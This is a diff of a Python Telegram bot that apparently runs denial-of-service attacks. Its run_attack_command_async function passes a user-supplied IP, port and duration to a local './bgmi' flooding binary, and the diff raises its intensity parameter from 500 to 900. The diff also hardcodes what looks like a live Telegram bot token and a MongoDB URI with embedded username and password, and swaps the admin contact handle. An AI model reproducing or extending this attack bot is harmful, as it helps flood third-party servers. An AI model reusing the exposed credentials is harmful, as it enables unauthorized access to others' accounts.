@@ -16,11 +16,11 @@ from telebot.types import ReplyKeyboardMarkup, KeyboardButton
 
 loop = asyncio.get_event_loop()
 
-TOKEN = 'TOKEN'
+TOKEN = '7376455437:AAGhpTu0cYJ3J48RbTpYysBqILN3mLj5cgI'
 MONGO_URI = 'mongodb+srv://VENOMxCRAZY:CRAZYxVENOM@cluster0.ythilmw.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0&tlsAllowInvalidCertificates=true'
-FORWARD_CHANNEL_ID = -1002224570220
-CHANNEL_ID = -1002224570220
-error_channel_id = -1002224570220
+FORWARD_CHANNEL_ID = -1002202196138
+CHANNEL_ID = -1002202196138
+error_channel_id = -1002202196138
 
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 
@@ -84,7 +84,7 @@ async def start_asyncio_loop():
         await asyncio.sleep(REQUEST_INTERVAL)
 
 async def run_attack_command_async(target_ip, target_port, duration):
-    process = await asyncio.create_subprocess_shell(f"./bgmi {target_ip} {target_port} {duration} 500")
+    process = await asyncio.create_subprocess_shell(f"./bgmi {target_ip} {target_port} {duration} 900")
     await process.communicate()
 
 def is_user_admin(user_id, chat_id):
@@ -254,7 +254,7 @@ def handle_message(message):
     elif message.text == "Help❓":
         bot.reply_to(message, "*Help selected*", parse_mode='Markdown')
     elif message.text == "Contact admin✔️":
-        bot.reply_to(message, "*Contact admin @venomXcrazy*", parse_mode='Markdown')
+        bot.reply_to(message, "*Contact admin @YUVRAJXMODS*", parse_mode='Markdown')
     else:
         bot.reply_to(message, "*Invalid option*", parse_mode='Markdown')
 
